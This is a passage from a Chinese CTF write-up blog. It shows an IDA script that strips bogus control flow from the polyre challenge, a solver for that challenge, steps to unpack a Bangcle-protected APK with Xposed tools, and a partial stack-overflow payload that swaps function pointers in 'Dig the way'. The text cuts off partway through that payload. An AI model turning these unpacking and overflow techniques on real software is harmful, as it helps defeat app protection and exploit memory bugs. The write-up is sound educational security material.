num_seq)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">tmp = num_seq[i] + <span class="number">20</span></span><br><span class="line">tmp = tmp &amp; <span class="number">0xF3</span> | ~tmp &amp; <span class="number">0xC</span></span><br><span class="line">num_seq[i] = tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">40</span>, <span class="number">2</span>):</span><br><span class="line">num_seq[i], num_seq[i+<span class="number">1</span>] = num_seq[i+<span class="number">1</span>], num_seq[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">num_seq[<span class="number">20</span>+i], num_seq[i] = num_seq[i], num_seq[<span class="number">20</span>+i]</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">chr</span>, num_seq)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(flag)</span><br></pre></td></tr></table></figure><br><h3 id="RoarCTF2019-polyre-x86-elf-ollvm平坦化-虚假控制流"><a href="#RoarCTF2019-polyre-x86-elf-ollvm平坦化-虚假控制流" class="headerlink" title="[RoarCTF2019]polyre | x86,elf,ollvm平坦化,虚假控制流"></a>[RoarCTF2019]polyre | x86,elf,ollvm平坦化,虚假控制流</h3><p>跟 <strong>[安洵杯 2019]game</strong> 一样，先用脚本去掉 main 函数的平坦化 <code>python deflat.py -f polyre --addr 0x400620</code>。再用 ida 打开，发现还有一些有规律的永真判断：</p><p><img src="../img/RoarCTF2019polyre/1.png" alt="RoarCTF2019polyre"></p><p>因此可以在观察时忽略或删除 while 语句和 do…while 语句，我选择写 ida 脚本来删掉虚假控制流方便观察。首先观察一下汇编，发现有一段代码总是出现：</p><p><img src="../img/RoarCTF2019polyre/2.png" alt="RoarCTF2019polyre"></p><p>把 jnz pacth 成 jmp，while 循环就会消失掉。需要注意，jnz 的 opcode 占两个字节（0x0F 0x85），而 jmp 的 opcode 只占用 1 个字节（0xE9），所以 jnz 指令长度为 6，jmp 的指令长度为 5，在 patch 时还应该把 jnz 指令的最后一个字节 patch 成 0x90（nop）。下面是脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># 参考官方wp</span></span><br><span class="line"><span class="comment"># 获取下一条指令地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="comment"># ItemSize返回addr处指令长度</span></span><br><span class="line"><span class="keyword">return</span> addr + ItemSize(addr)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x401117</span><span class="comment"># 起始地址</span></span><br><span class="line"><span class="keyword">while</span>(addr &lt; <span class="number">0x402144</span>):<span class="comment"># 结束地址</span></span><br><span class="line"><span class="built_in">next</span> = next_instr(addr)</span><br><span class="line"><span class="comment"># GetDisasm返回addr处汇编代码</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;dword_603054&quot;</span> <span class="keyword">in</span> GetDisasm(addr):<span class="comment"># 先找到有dword_603054的汇编语句</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">addr = <span class="built_in">next</span></span><br><span class="line"><span class="built_in">next</span> = next_instr(addr)<span class="comment"># 向下找到jnz</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;jnz&quot;</span> <span class="keyword">in</span> GetDisasm(addr):</span><br><span class="line">dest = GetOperandValue(addr, <span class="number">0</span>)<span class="comment"># 获取jnz跳转的目的地址</span></span><br><span class="line">PatchByte(addr, <span class="number">0xE9</span>)<span class="comment"># 将jnz patch成jmp</span></span><br><span class="line">offset = dest - (addr + <span class="number">5</span>)<span class="comment"># 计算目的地址相对addr的偏移offset</span></span><br><span class="line">PatchDword(addr + <span class="number">1</span>, offset)<span class="comment"># 将jmp操作数patch为offset</span></span><br><span class="line">PatchByte(addr + <span class="number">5</span>, <span class="number">0x90</span>)<span class="comment"># patch jnz指令最后一个字节为nop</span></span><br><span class="line">addr = <span class="built_in">next</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">addr = <span class="built_in">next</span></span><br></pre></td></tr></table></figure><p>在 ida 中执行后重新 F5，得到逻辑清晰的 main 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  v11 = input;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = i;</span><br><span class="line">    v13 = i &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">64</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = input[i];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;input[i];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = j;</span><br><span class="line">    v19 = j &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = input;</span><br><span class="line">    v4 = *(_QWORD *)&amp;input[<span class="number">8</span> * j];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = k;</span><br><span class="line">      v22 = k &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">64</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span class="number">2</span> * v4;</span><br><span class="line">        v4 *= <span class="number">2LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = <span class="number">2</span> * v4;</span><br><span class="line">        v4 = <span class="number">2</span> * v4 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = k;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * j;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * j];</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    v32 = j + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的逻辑是输入 48 个字符，分 6 次处理。每次取来 8 个字节（存在 v4 中），进行 64 轮计算，每轮判断 v4 是否小于 0，小于 0 就左移一位后异或 0xB0004B7679FA26B3，否则就只是左移一位，最后与一个数组 unk_402170 进行比较。解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">raw = <span class="string">&quot;96 62 53 43 6D F2 8F BC 16 EE 30 05 78 00 01 52 EC 08 5F 93 EA B5 C0 4D 50 F4 53 D8 AF 90 2B 34 81 36 2C AA BC 0E 25 8B E4 8A C6 A2 81 9F 75 55&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">8</span>):</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">now = raw[i:i+<span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">tmp += now[j]</span><br><span class="line">target.append(<span class="built_in">int</span>(tmp, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">tmp = target[i]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="keyword">if</span> tmp % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">tmp += <span class="number">1</span> &lt;&lt; <span class="number">64</span></span><br><span class="line">tmp = tmp ^ <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line">tmp //= <span class="number">2</span></span><br><span class="line">flag += struct.pack(<span class="string">&quot;q&quot;</span>, tmp)</span><br><span class="line"><span class="built_in">print</span> flag.rstrip(<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里我取了巧，如果上一轮异或了 0xB0004B7679FA26B3，那 v4 的最低位应该是 1，说明 v4 是个奇数，所以有 <code>if tmp % 2 == 1</code> 这个判断。<code>tmp += 1 &lt;&lt; 64</code> 是为了防止负数因为 <code>tmp //= 2</code> 变成正数</p><br><h3 id="网鼎杯-2020-青龙组-bang-JVM-apk-apk加固-java层"><a href="#网鼎杯-2020-青龙组-bang-JVM-apk-apk加固-java层" class="headerlink" title="[网鼎杯 2020 青龙组]bang | JVM,apk,apk加固,java层"></a>[网鼎杯 2020 青龙组]bang | JVM,apk,apk加固,java层</h3><p>看这个题目名字就知道是梆梆加固了，脱壳需要用到</p><ul><li>安装了 Xposed 的模拟器，教程见 <a href="https://in1nit1t.github.io/2020/10/13/Xposed%E4%B8%8EEdXposed%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/">Xposed与EdXposed框架搭建</a> 的第一部分</li><li><a href="https://qyma.lanzous.com/b04xxlujg">反射大师</a></li><li>MT 文件管理器</li></ul><p>确保模拟器 Xposed 框架已被激活后，点击上方链接下载最新版反射大师，在模拟器中安装。打开反射大师，会弹出如下提示：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/1.png" alt="网鼎杯2020青龙组bang"></p><p>点击模块管理会跳转到 Xposed Installer，在模块中勾选反射大师，并重启模拟器：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/2.png" alt="网鼎杯2020青龙组bang"></p><p>打开反射大师，点击 how_debug 这个应用，选择 “选择这个软件”：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/3.png" alt="网鼎杯2020青龙组bang"></p><p>在弹出的提示中选择 “打开”：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/4.png" alt="网鼎杯2020青龙组bang"></p><p>点击中央的六芒星：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/5.png" alt="网鼎杯2020青龙组bang"></p><p>选择 “当前ACTIVITY”：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/6.png" alt="网鼎杯2020青龙组bang"></p><p>选择 “写出DEX”：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/7.png" alt="网鼎杯2020青龙组bang"></p><p>打开 “修复 Magic”，点击确定：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/8.png" alt="网鼎杯2020青龙组bang"></p><p>在弹出的提示中，点击复制，获得路径：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/9.png" alt="网鼎杯2020青龙组bang"></p><p>打开 MT 文件管理器，点击上方路径，弹出跳转对话框：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/10.png" alt="网鼎杯2020青龙组bang"></p><p>粘贴路径并跳转，将 classes.dex 复制到 PC（MuMu 模拟器是复制到 <strong>/storage/emulated/0/MuMu共享文件夹</strong>），用 jadx 打开，在 MainActivity 的 onCreate 方法中找到 flag：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84bang/11.png" alt="网鼎杯2020青龙组bang"></p><br><h3 id="Dig-the-way-x86-exe-栈溢出"><a href="#Dig-the-way-x86-exe-栈溢出" class="headerlink" title="Dig the way | x86,exe,栈溢出"></a>Dig the way | x86,exe,栈溢出</h3><p>main 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">20</span>]; <span class="comment">// [esp+1Ch] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> ret[<span class="number">4</span>]; <span class="comment">// [esp+30h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> arg2; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> arg3; <span class="comment">// [esp+44h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> (__cdecl *func[<span class="number">3</span>])(<span class="keyword">int</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>); <span class="comment">// [esp+48h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+54h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> fSize; <span class="comment">// [esp+58h] [ebp-Ch]</span></span><br><span class="line">  FILE *hFile; <span class="comment">// [esp+5Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  func[<span class="number">0</span>] = func0;                              <span class="comment">// ret[arg2]与ret[arg3]交换位置</span></span><br><span class="line">  func[<span class="number">1</span>] = func1;                              <span class="comment">// abs(ret[arg2]+ret[arg3])-abs(ret[arg2])-abs(ret[arg3])+2</span></span><br><span class="line">  func[<span class="number">2</span>] = func2;                              <span class="comment">// abs(ret[arg3])-abs(ret[arg3]+ret[arg2])+abs(ret[arg2])+2</span></span><br><span class="line">  ret[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  ret[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  ret[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">  ret[<span class="number">3</span>] = <span class="number">3</span>;</span><br><span class="line">  arg2 = <span class="number">3</span>;</span><br><span class="line">  arg3 = <span class="number">4</span>;</span><br><span class="line">  hFile = fopen(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hFile )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  fseek(hFile, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  fSize = ftell(hFile);                         <span class="comment">// fSize 文件大小</span></span><br><span class="line">  fseek(hFile, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v12 = ftell(hFile);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; fSize; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = i;</span><br><span class="line">      v7[v4] = fgetc(hFile);                    <span class="comment">// 存在栈溢出</span></span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(v7);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= fSize )</span><br><span class="line">    &#123;</span><br><span class="line">      fSize = ret[<span class="number">3</span>];</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      v12 = arg3;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt;= <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = i + <span class="number">1</span>;</span><br><span class="line">        ret[v6] = func[i](ret, arg2, arg3);</span><br><span class="line">        arg2 = ++i;</span><br><span class="line">        arg3 = i + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ret[<span class="number">3</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        get_key(fSize, v12);</span><br><span class="line">        system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我有三个函数：</p><ul><li>func0：ret[arg2]与ret[arg3]交换位置</li><li>func1：abs(ret[arg2] + ret[arg3]) - abs(ret[arg2]) - abs(ret[arg3]) + 2</li><li>func2：abs(ret[arg3]) - abs(ret[arg3] + ret[arg2]) + abs(ret[arg2]) + 2</li></ul><p>目标是让 ret[3] = 0，注意到 ret[3] 最后是被 func[2] 的返回值赋值了，如果按正常流程，func[2] 即 func2，这个函数的返回值是恒大于 0 的，自然是拿不到 flag。而 func0 只返回 1，故只有在最后调用 func1 才有希望。那就需要将 func1 与 func2 的位置调换，自然就需要用到 func0 了。所以期望的逻辑是：func0 交换 func1 和 func2的位置 -&gt; 先调用 func2 -&gt; 再调用 func1</p><p>程序正好存在一个溢出点（for 循环溢出 v7），可以修改到 ret 数组、arg2、arg3（注意到 arg2、arg3 只有第一次调用 func[0] 时是可控的，后面就会被赋值为 ++i 和 i + 1）。func[1]、func[2] 相对于 ret[0] 的偏移是 7、8，那得把 arg2、arg3 修改为 7、8 才能保证调用 func0 时将 func[1]、func[2] 交换。调用完 func0，会使得 ret[1] = 1，假设 ret[2] 我修改为 0，那么在调用 func[1] 即 func2 时，会使得 ret[2] = 2。在调用 func[2] 即 func1 时，传递的三个参数依次是 ret,2,3，此时 ret[2] = 2，只有让 ret[3] = -1 才能保证 func1 返回 0。所以构造的 data 数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA 00 